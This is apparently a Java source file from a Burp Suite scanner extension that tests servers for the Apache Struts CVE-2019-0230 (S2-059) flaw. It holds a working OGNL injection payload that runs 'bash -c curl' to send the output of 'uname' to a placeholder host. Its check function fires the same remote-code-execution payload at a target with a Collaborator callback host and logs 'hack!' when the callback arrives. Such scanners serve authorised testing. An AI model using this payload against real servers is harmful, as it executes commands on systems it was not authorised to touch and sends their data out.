package burp.vuls;

import burp.*;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;

public class Struts {
    public static String CVE_2019_0230_poc = "##Condition##\n" +
            "Apache Struts 2.0.0 - 2.5.20\n\n" +
            "##POC##\n" +
            "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://xxx.com/`uname`'}))}";

    public static void CVE_2019_0230() {
        String poc = CVE_2019_0230_poc;

        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        String payload = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", poc, "hack!"));
        }else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230(S2-059)", poc, "pass"));
        }
    }

}
